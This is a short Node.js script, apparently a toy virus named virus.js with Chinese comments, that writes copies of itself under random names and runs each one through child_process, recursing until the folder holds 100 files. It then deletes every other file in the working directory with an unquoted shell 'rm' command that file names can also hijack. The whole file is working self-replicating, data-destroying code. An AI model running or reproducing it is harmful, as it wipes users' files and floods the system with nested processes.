const fs = require('fs');
const cp = require('child_process');



const isContinue = () => {//是否继续生成文件副本
	const files = fs.readdirSync('./');
	return files.length < 100;
}

const clean = () => {//清空所有的文件
	const files = fs.readdirSync('./');
	files.forEach(file => {
		if(file === 'virus.js') return;
		cp.execSync(`rm ${file}`)
	})
}

if(!isContinue()) return clean();

const content = fs.readFileSync('./virus.js', 'utf8');
const filename = `./virus_${Math.floor(1000000 * Math.random())}.js`;
fs.writeFileSync(filename, content, 'utf8');
//执行新生成的文件
cp.execSync(`node ${filename}`);
